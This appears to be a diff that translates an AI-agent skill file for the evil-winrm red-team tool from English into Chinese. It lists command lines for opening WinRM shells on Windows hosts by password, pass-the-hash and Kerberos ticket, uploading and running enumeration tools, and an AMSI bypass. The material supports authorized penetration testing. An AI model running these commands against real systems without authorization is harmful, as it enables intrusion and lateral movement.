@@ -1,91 +1,85 @@
 ---
 name: evil-winrm
 description: >
-  This skill should be used when the user asks about "evil-winrm", "get a
-  shell on a Windows host via WinRM", "use pass-the-hash over WinRM, upload
-  tools", "run PowerShell remotely". Interactive WinRM shell for Windows
-  remote management with support for pass-the-hash, pass-the-ticket, SSL, file
-  upload/download, and PowerShell scripts.
+  此技能适用于用户询问关于 "evil-winrm"、"通过 WinRM 获取 Windows 主机 shell"、"使用哈希传递 (Pass-the-Hash) 连接 WinRM"、"上传工具"、"远程执行 PowerShell" 的场景。支持哈希传递、票据传递、SSL、文件上传/下载和 PowerShell 脚本的交互式 WinRM shell。
 ---
 
 # evil-winrm
 
-Interactive WinRM shell — the standard for Windows remote access in red team ops.
+交互式 WinRM shell — 红队 Windows 远程访问的标准工具。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Connect with password
+# 密码连接
 evil-winrm -i 192.168.1.10 -u administrator -p Password123
 
-# Pass-the-hash (NTLM)
+# 哈希传递 (Pass-the-Hash, NTLM)
 evil-winrm -i 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117
 
-# With SSL (port 5986)
+# 使用 SSL（端口 5986）
 evil-winrm -i 192.168.1.10 -u admin -p Password123 -S
 ```
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
+| 参数 | 说明 |
 |------|-------------|
-| `-i <ip>` | Target IP/hostname |
-| `-u <user>` | Username |
-| `-p <pass>` | Password |
-| `-H <hash>` | NTLM hash (LM:NT or NT only) |
-| `-P <port>` | WinRM port (default 5985) |
-| `-S` | Use SSL (port 5986) |
-| `-c <cert>` | Client certificate for auth |
-| `-r <realm>` | Kerberos realm |
-| `-s <path>` | Path to PowerShell scripts to load |
-| `-e <path>` | Path to executables (for upload) |
-| `-l <path>` | Log output to file |
-| `--no-colors` | Disable colors |
+| `-i <ip>` | 目标 IP/主机名 |
+| `-u <user>` | 用户名 |
+| `-p <pass>` | 密码 |
+| `-H <hash>` | NTLM 哈希（LM:NT 或仅 NT） |
+| `-P <port>` | WinRM 端口（默认 5985） |
+| `-S` | 使用 SSL（端口 5986） |
+| `-c <cert>` | 用于认证的客户端证书 |
+| `-r <realm>` | Kerberos 域 |
+| `-s <path>` | 要加载的 PowerShell 脚本路径 |
+| `-e <path>` | 可执行文件路径（用于上传） |
+| `-l <path>` | 将输出记录到文件 |
+| `--no-colors` | 禁用颜色 |
 
-## Shell Commands
+## Shell 内置命令
 
-Once connected, use built-in evil-winrm commands:
+连接后可使用 evil-winrm 内置命令：
 
-| Command | Description |
+| 命令 | 说明 |
 |---------|-------------|
-| `upload <local> [remote]` | Upload file to target |
-| `download <remote> [local]` | Download file from target |
-| `menu` | Show available functions |
-| `Invoke-Binary <path>` | Execute binary from upload path |
-| `Bypass-4MSI` | AMSI bypass (built-in) |
-| `services` | List running services |
-| `exit` | Close session |
+| `upload <local> [remote]` | 上传文件到目标 |
+| `download <remote> [local]` | 从目标下载文件 |
+| `menu` | 显示可用功能 |
+| `Invoke-Binary <path>` | 执行上传路径中的二进制文件 |
+| `Bypass-4MSI` | AMSI 绕过（内置） |
+| `services` | 列出运行中的服务 |
+| `exit` | 关闭会话 |
 
-## Common Workflows
+## 常用工作流
 
 ```bash
-# Basic session
+# 基础会话
 evil-winrm -i 10.10.10.10 -u admin -p "Password123"
 
-# Pass-the-hash after extracting hashes
+# 提取哈希后进行哈希传递
 evil-winrm -i 10.10.10.10 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"
 
-# Upload a tool and execute
+# 上传工具并执行
 evil-winrm -i 10.10.10.10 -u admin -p pass -e /opt/tools/
-# Inside shell:
+# shell 内部：
 # upload /opt/tools/winpeas.exe
 # ./winpeas.exe
 
-# Load custom PS scripts
+# 加载自定义 PS 脚本
 evil-winrm -i 10.10.10.10 -u admin -p pass -s /opt/scripts/
-# Inside shell:
+# shell 内部：
 # PowerView.ps1
 # Get-NetDomain
 
-# Kerberos auth (with valid ticket)
+# Kerberos 认证（需要有效票据）
 export KRB5CCNAME=/tmp/admin.ccache
 evil-winrm -i dc.domain.local -r DOMAIN.LOCAL -u admin
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/winrm-setup.md` | WinRM configuration, firewall rules, Kerberos auth setup |
-
-## Structuring This Skill
+| `references/winrm-setup.md` | WinRM 配置、防火墙规则、Kerberos 认证设置 |
